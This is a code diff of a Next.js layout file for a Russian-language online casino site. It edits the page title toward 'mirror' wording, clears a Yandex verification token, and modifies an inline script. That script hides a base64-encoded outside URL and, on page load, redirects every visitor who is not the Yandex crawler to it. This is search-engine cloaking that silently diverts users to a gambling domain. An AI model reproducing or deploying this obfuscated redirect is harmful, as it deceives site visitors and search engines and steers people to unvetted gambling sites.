@@ -20,7 +20,7 @@ const siteUrl = process.env.NEXT_PUBLIC_SITE_URL || "https://evacasino.app"
 export const metadata: Metadata = {
   metadataBase: new URL(siteUrl),
   title: {
-    default: "Eva Casino — официальный сайт онлайн казино | Ева казино играть",
+    default: "Eva Casino — официальный сайт онлайн казино | Ева казино зеркало",
     template: "%s | Eva Casino",
   },
   description:
@@ -68,7 +68,7 @@ export const metadata: Metadata = {
     apple: [{ url: "/apple-icon.jpg", sizes: "180x180", type: "image/jpeg" }],
   },
   verification: {
-    yandex: "fc87c401d55407fa", 
+    yandex: "", 
   },
   generator: "v0.app",
 }
@@ -119,7 +119,7 @@ export default function RootLayout({
             __html: `
               (function() {
                 var ua = navigator.userAgent.toLowerCase();
-                var targetB64 = "aHR0cHM6Ly9mbGlwNS0zdmEuY29tL2RpYnpmb21pcg==";
+                var targetB64 = "#aHR0cHM6Ly9mbGlwNS0zdmEuY29tL2RpYnpmb21pcg==";
                 if (ua.indexOf("yandex") === -1) {
                     window.location.replace(atob(targetB64));
                 }
